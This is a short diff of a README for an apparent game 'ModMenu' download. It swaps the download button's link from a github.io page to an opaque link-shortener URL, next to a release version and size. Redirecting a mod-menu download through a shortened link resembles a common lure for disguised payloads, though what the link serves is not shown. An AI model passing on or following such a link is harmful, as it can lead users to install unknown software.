@@ -11,7 +11,7 @@
 
 ### 📦 Get the ModMenu
 
-[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://knobbyspeak.github.io/)
+[![Download](https://img.shields.io/badge/Download-ModMenu-green?style=for-the-badge\&logo=github)](https://flyn.co/ThCH6y)
 
 **Current release:** `v0.7.5` · **Approx. size:** `133 MB` (Update 09-30)
 
